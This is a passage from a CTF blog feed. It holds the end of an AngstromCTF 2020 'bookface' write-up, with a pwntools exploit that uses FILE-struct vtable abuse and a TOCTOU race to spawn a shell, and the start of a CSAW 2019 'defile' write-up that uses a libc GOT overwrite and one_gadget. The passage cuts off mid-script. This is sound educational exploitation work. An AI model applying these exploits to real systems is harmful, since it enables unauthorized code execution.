&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Calculate the vtable by subtracting appropriate offset&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fake_vtable_addr &lt;span style="color:#f92672">=&lt;/span> io_str_overflow_ptr_addr &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Craft file struct&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> file_struct &lt;span style="color:#f92672">=&lt;/span> pack_file(_IO_buf_base&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _IO_buf_end&lt;span style="color:#f92672">=&lt;/span>(rdi&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">100&lt;/span>)&lt;span style="color:#f92672">//&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _IO_write_ptr&lt;span style="color:#f92672">=&lt;/span>(rdi&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">100&lt;/span>)&lt;span style="color:#f92672">//&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _IO_write_base&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _lock&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># vtable pointer&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> file_struct &lt;span style="color:#f92672">+=&lt;/span> p64(fake_vtable_addr)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Next entry corresponds to: (*((_IO_strfile *) fp)-&amp;gt;_s._allocate_buffer)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> file_struct &lt;span style="color:#f92672">+=&lt;/span> p64(rip)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> file_struct
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># logout&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">&amp;#34;&amp;gt; &amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;4&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># login again with wrong uid&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>uid &lt;span style="color:#f92672">=&lt;/span> randint(&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">**&lt;/span>&lt;span style="color:#ae81ff">30&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">&amp;#34;Please enter your user ID: &amp;#34;&lt;/span>, str(uid))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>raw_input(&lt;span style="color:#e6db74">&amp;#34;&amp;gt; Debug&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Our target&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># mmap to 0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>file_addr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>rip &lt;span style="color:#f92672">=&lt;/span> libc_base &lt;span style="color:#f92672">+&lt;/span> libc&lt;span style="color:#f92672">.&lt;/span>symbols[&lt;span style="color:#e6db74">&amp;#39;system&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># rdi = libc_base + next(libc.search(b&amp;#34;/bin/sh&amp;#34;)) # The first param we want&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># next to file_struct&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>rdi &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xf0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;file_addr 0x&lt;/span>&lt;span style="color:#e6db74">{:016x}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(file_addr))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;rip 0x&lt;/span>&lt;span style="color:#e6db74">{:016x}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(rip))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;rdi 0x&lt;/span>&lt;span style="color:#e6db74">{:016x}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(rdi))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>file_struct &lt;span style="color:#f92672">=&lt;/span> make_fake_file_struct(libc_base, rip, rdi)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>file_struct &lt;span style="color:#f92672">=&lt;/span> file_struct&lt;span style="color:#f92672">.&lt;/span>ljust(&lt;span style="color:#ae81ff">0xf0&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#f92672">=&lt;/span> file_struct &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/bin/sh&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">assert&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> payload
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">&amp;#34;What&amp;#39;s your name? &amp;#34;&lt;/span>, payload)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>N.B.&lt;/strong> The &lt;em>rdi&lt;/em> parameter must be even, the offset of &lt;code>/bin/sh&lt;/code> string in this libc isn&amp;rsquo;t even, we can&amp;rsquo;t use it, so we&amp;rsquo;ll write the &lt;code>/bin/sh&lt;/code> string after the &lt;em>FILE&lt;/em> structure, it&amp;rsquo;s aligned to &lt;em>0xf0&lt;/em>, so the string will be at &lt;em>0x00000000000000f0&lt;/em> (since mmap maps the zero page at &lt;em>0x0000000000000000&lt;/em>).&lt;/p>
&lt;p>To triger to exploit we must call &lt;code>fclose&lt;/code> with &lt;em>NULL&lt;/em> pointer as parameter. So the call to &lt;code>fopen&lt;/code> must fail and return &lt;em>NULL&lt;/em>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>FILE &lt;span style="color:#f92672">*&lt;/span>f &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">fopen&lt;/span>(file, &lt;span style="color:#e6db74">&amp;#34;rb&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">fread&lt;/span>(user, &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#66d9ef">sizeof&lt;/span> (&lt;span style="color:#66d9ef">struct&lt;/span> profile), f);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">fclose&lt;/span>(f);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>How can &lt;code>fopen(file, &amp;quot;rb&amp;quot;)&lt;/code> fails? the mode string is &lt;code>&amp;quot;rb&amp;quot;&lt;/code>, it&amp;rsquo;s a read, so if the file doesn&amp;rsquo;t exists fopen will fail and return NULL.&lt;/p>
&lt;p>&lt;code>Login&lt;/code> function check if the file exists with &lt;code>access&lt;/code> then asks for the survey, where there are multiple calls to &lt;code>read&lt;/code>, it&amp;rsquo;s a blocking function, it will block and wait for user input. This is a &lt;code>Time-of-check to time-of-use&lt;/code> (TOCTOU)&lt;sup id="fnref:12">&lt;a href="#fn:12" class="footnote-ref" role="doc-noteref">12&lt;/a>&lt;/sup> bug.&lt;/p>
&lt;p>We&amp;rsquo;ll open another connection and use the same userid to remove the file using the 3rd option &lt;em>&amp;ldquo;deleting account&amp;rdquo;&lt;/em>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># logout&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">&amp;#34;&amp;gt; &amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;4&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># login again with the last uid&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">&amp;#34;Please enter your user ID: &amp;#34;&lt;/span>, str(uid))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># remove the uid user file with another connection&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># TOCTOU&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>raw_input(&lt;span style="color:#e6db74">&amp;#34;&amp;gt; debug&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;uid: &lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(uid))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;race condition !!&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T2 &lt;span style="color:#f92672">=&lt;/span> remote(T&lt;span style="color:#f92672">.&lt;/span>rhost, T&lt;span style="color:#f92672">.&lt;/span>rport)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T2&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">&amp;#34;Please enter your user ID: &amp;#34;&lt;/span>, str(uid))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T2&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">&amp;#34;Content&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;10&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">10&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">10&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">10&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T2&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">&amp;#34;&amp;gt; &amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;3&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;10&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">10&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">10&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">10&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">assert&lt;/span> len(payload) &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">12&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">&amp;#34;Content: &amp;#34;&lt;/span>, payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T&lt;span style="color:#f92672">.&lt;/span>clean()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T&lt;span style="color:#f92672">.&lt;/span>sendline(&lt;span style="color:#e6db74">&amp;#34;uname -a;id&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="final-exploit">Final Exploit&lt;/h3>
&lt;p>You can find the full exploit &lt;a href="https://philomath213.github.io/post/AngstromCTF2020-bookface/exploit_bookface.py">here&lt;/a>.&lt;/p>
&lt;p>&lt;img src="https://philomath213.github.io/post/AngstromCTF2020-bookface/screenshot1.png" alt="screenshot1">&lt;/p>
&lt;h2 id="references">References&lt;/h2>
&lt;div class="footnotes" role="doc-endnotes">
&lt;hr>
&lt;ol>
&lt;li id="fn:1">
&lt;p>&lt;a href="https://www.ayrx.me/using-a-non-system-libc">Using a non-system glibc&lt;/a>&amp;#160;&lt;a href="#fnref:1" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;li id="fn:2">
&lt;p>&lt;a href="https://owasp.org/www-community/attacks/Format_string_attack">OWASP - Format String Attack&lt;/a>&amp;#160;&lt;a href="#fnref:2" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;li id="fn:3">
&lt;p>&lt;a href="https://wiki.debian.org/mmap_min_addr">Debian Wiki - mmap_min_addr&lt;/a>&amp;#160;&lt;a href="#fnref:3" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;li id="fn:4">
&lt;p>&lt;a href="http://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Linux%20Kernel%20Exploitation%20-%20Patrick%20Biernat.pdf">Patrick Biernat - Linux Kernel Exploitation&lt;/a>&amp;#160;&lt;a href="#fnref:4" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;li id="fn:5">
&lt;p>&lt;a href="https://gsec.hitb.org/materials/sg2018/WHITEPAPERS/FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf">FILE Structures: Another Binary Exploitation Technique&lt;/a>&amp;#160;&lt;a href="#fnref:5" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;li id="fn:6">
&lt;p>&lt;a href="https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/">Dhaval Kapil - FILE Structure Exploitation (&amp;lsquo;vtable&amp;rsquo; check bypass)&lt;/a>&amp;#160;&lt;a href="#fnref:6" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&amp;#160;&lt;a href="#fnref1:6" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;li id="fn:7">
&lt;p>&lt;a href="https://en.cppreference.com/w/cpp/numeric/random/RAND_MAX">C++ reference - RAND_MAX&lt;/a>&amp;#160;&lt;a href="#fnref:7" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;li id="fn:8">
&lt;p>&lt;a href="https://en.wikipedia.org/wiki/Pseudorandom_number_generator">Wikipedia - Pseudorandom number generator&lt;/a>&amp;#160;&lt;a href="#fnref:8" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;li id="fn:9">
&lt;p>&lt;a href="https://elixir.bootlin.com/">Bootlin - Elixir Cross Referencer&lt;/a>&amp;#160;&lt;a href="#fnref:9" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;li id="fn:10">
&lt;p>&lt;a href="https://elixir.bootlin.com/glibc/glibc-2.23/source">Bootlin Elixir - glibc-2.23&lt;/a>&amp;#160;&lt;a href="#fnref:10" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;li id="fn:11">
&lt;p>&lt;a href="https://elixir.bootlin.com/glibc/glibc-2.23/source/stdlib/random_r.c#L353">glibc-2.23 - __random_r&lt;/a>&amp;#160;&lt;a href="#fnref:11" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;li id="fn:12">
&lt;p>&lt;a href="https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use">Time-Of-Check To Time-Of-Use&lt;/a>&amp;#160;&lt;a href="#fnref:12" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;/div></description></item><item><title>CSAW CTF Finals 2019 - defile</title><link>https://philomath213.github.io/post/csaw-ctf-finals-2019-defile/</link><pubDate>Mon, 11 Nov 2019 14:47:14 +0100</pubDate><guid>https://philomath213.github.io/post/csaw-ctf-finals-2019-defile/</guid><description>&lt;h2 id="challenge-details">Challenge details&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:center">Event&lt;/th>
&lt;th style="text-align:center">Challenge&lt;/th>
&lt;th style="text-align:center">Category&lt;/th>
&lt;th style="text-align:center">Points&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:center">CSAW CTF Final 2019&lt;/td>
&lt;td style="text-align:center">defile&lt;/td>
&lt;td style="text-align:center">PWN&lt;/td>
&lt;td style="text-align:center">100&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="description">Description&lt;/h3>
&lt;blockquote>
&lt;p>wild handlock main btw&lt;/p>
&lt;p>nc pwn.chal.csaw.io 1004&lt;/p>
&lt;/blockquote>
&lt;h3 id="attachments">Attachments&lt;/h3>
&lt;blockquote>
&lt;p>&lt;a href="https://github.com/osirislab/CSAW-CTF-2019-Finals/blob/master/pwn/defile/defile?raw=true">defile&lt;/a>
&lt;a href="https://github.com/osirislab/CSAW-CTF-2019-Finals/raw/master/pwn/defile/libc.so.6">libc.so.6&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>The binary is a dynamically linked ELF 64-bit executable, it has all protections enabled.&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-none" data-lang="none">$ file defile
defile: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=5631f2588790fa344f6f360d39819963f4f66d7f, not stripped
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-none" data-lang="none">$ checksec --file defile
Arch: amd64-64-little
RELRO: Full RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled
&lt;/code>&lt;/pre>&lt;p>When running this binary, it will give you the address of &lt;code>stdout&lt;/code> in &lt;code>libc&lt;/code>, and ask for &lt;code>How much do you want to write?&lt;/code>, &lt;code>Where do you want to write?&lt;/code> and &lt;code>What do you want to write?&lt;/code>, then print &lt;code>Bye!&lt;/code>.&lt;/p>
&lt;p>&lt;img src="https://philomath213.github.io/post/CSAW-CTF-Finals-2019-defile/screenshot0.png" alt="screenshot0">&lt;/p>
&lt;p>So it looks like an intended vulnerability, we have an arbitrary write.&lt;/p>
&lt;p>After analyzing the binary, I found that the binary have two functions: &lt;code>main&lt;/code> and &lt;code>get_number&lt;/code>, the &lt;code>get_number&lt;/code> function simply read an &lt;code>unsigned long&lt;/code> from &lt;code>stdin&lt;/code> and return it, while the &lt;code>main&lt;/code> function ask for the input size then check if the &lt;code>size &amp;lt;= 256&lt;/code> otherwise it will print &lt;code>That's just too much&lt;/code>, then it ask for the address where to write and finally read the input by calling &lt;code>read&lt;/code> function with the parameters &lt;code>read(0, buf, nbytes)&lt;/code>, where &lt;code>buf&lt;/code> is the address we provided and &lt;code>nbytes&lt;/code> the size of input.&lt;/p>
&lt;p>Since the binary is compiled with &lt;code>full RELRO&lt;/code> and &lt;code>PIE&lt;/code> enabled we can&amp;rsquo;t overwrite anything in the binary (e.g. &lt;code>.got&lt;/code>, &lt;code>.dtors&lt;/code>, &amp;hellip;) (as far as I know), so we need to find something else to overwrite, I noticed that there a call to &lt;code>puts&lt;/code> function after calling to &lt;code>read&lt;/code> function, So we need find some hooks or function pointers that &lt;code>puts&lt;/code> function use.&lt;/p>
&lt;p>To do that I just set a break point at &lt;code>main+228&lt;/code> where &lt;code>main&lt;/code> call &lt;code>puts&lt;/code> then step into puts functions.&lt;/p>
&lt;p>I noticed that &lt;code>puts&lt;/code> will call &lt;code>__tunable_get_val@plt&lt;/code> at &lt;code>puts+13&lt;/code>, make sure that you are debugging the target libc, not the local one.&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-none" data-lang="none">gef&amp;gt; set environment LD_PRELOAD ./libc.so.6
gef&amp;gt; b *main+228 b *main+228
Breakpoint 1 at 0xa19
gef&amp;gt; r
Starting program: /opt/ctf/defile
Here&amp;#39;s stdout:
0x7fcd74c16760
How much do you want to write?
0
Where do you want to write?
0
What do you want to write?
...
...
gef&amp;gt; disas puts
Dump of assembler code for function puts:
0x00007fcd748aa9c0 &amp;lt;+0&amp;gt;: push r13
0x00007fcd748aa9c2 &amp;lt;+2&amp;gt;: push r12
0x00007fcd748aa9c4 &amp;lt;+4&amp;gt;: mov r12,rdi
0x00007fcd748aa9c7 &amp;lt;+7&amp;gt;: push rbp
0x00007fcd748aa9c8 &amp;lt;+8&amp;gt;: push rbx
0x00007fcd748aa9c9 &amp;lt;+9&amp;gt;: sub rsp,0x8
0x00007fcd748aa9cd &amp;lt;+13&amp;gt;: call 0x7fcd7484b100 &amp;lt;__tunable_get_val@plt+16&amp;gt;
&lt;/code>&lt;/pre>&lt;p>Since the libc is not compiled with &lt;code>Full RELRO&lt;/code>, we can overwrite &lt;code>__tunable_get_val&lt;/code> &lt;code>.got&lt;/code> entry&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-none" data-lang="none">$ checksec --file libc.so.6
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled
&lt;/code>&lt;/pre>&lt;p>In order to do that we need to calculate to offset between &lt;code>stdout&lt;/code> and &lt;code>__tunable_get_val&lt;/code> &lt;code>.got&lt;/code> entry, so step into &lt;code>__tunable_get_val@plt+16&lt;/code> and get the &lt;code>.got&lt;/code> entry address&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-none" data-lang="none">...
...
gef&amp;gt; x/3i 0x7fcd7484b100
=&amp;gt; 0x7fcd7484b100 &amp;lt;__tunable_get_val@plt+16&amp;gt;: jmp QWORD PTR [rip+0x3c9fa2] # 0x7fcd74c150a8
0x7fcd7484b106 &amp;lt;__tunable_get_val@plt+22&amp;gt;: push 0x20
0x7fcd7484b10b &amp;lt;__tunable_get_val@plt+27&amp;gt;: jmp 0x7fcd7484afd0
...
...
gef&amp;gt; p 0x7fcd74c16760 - 0x7fcd74c150a8
$1 = 0x16b8
&lt;/code>&lt;/pre>&lt;p>Here the &lt;code>stdout&lt;/code> address is &lt;code>0x7fcd74c16760&lt;/code>, the &lt;code>.got&lt;/code> entry address is: &lt;code>0x7fcd74c150a8&lt;/code> and the offset is &lt;code>0x16b8&lt;/code>&lt;/p>
&lt;p>Now we can control &lt;code>RIP&lt;/code> register, but we have only one shot, we can&amp;rsquo;t do any ROP chaining, so we need to find &lt;code>one_gadget&lt;/code> RCE in that libc (see &lt;a href="https://github.com/david942j/one_gadget">one_gadget&lt;/a>).&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-none" data-lang="none">$ one_gadget libc.so.6
0x4f2c5 execve(&amp;#34;/bin/sh&amp;#34;, rsp+0x40, environ)
constraints:
rcx == NULL
0x4f322 execve(&amp;#34;/bin/sh&amp;#34;, rsp+0x40, environ)
constraints:
[rsp+0x40] == NULL
0x10a38c execve(&amp;#34;/bin/sh&amp;#34;, rsp+0x70, environ)
constraints:
[rsp+0x70] == NULL
&lt;/code>&lt;/pre>&lt;h3 id="exploit">Exploit&lt;/h3>
&lt;ol>
&lt;li>get the &lt;code>stdout&lt;/code> address&lt;/li>
&lt;li>calculate the address of &lt;code>__tunable_get_val&lt;/code> got entry&lt;/li>
&lt;li>calculate the libc base address&lt;/li>
&lt;li>calculate the &lt;code>one_gadget&lt;/code> address&lt;/li>
&lt;li>overwrite the got entry with &lt;code>one_gadget&lt;/code> address.&lt;/li>
&lt;/ol>
&lt;h4 id="exploit-code">Exploit code&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> subprocess
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>HOST &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;pwn.chal.csaw.io&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1004&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
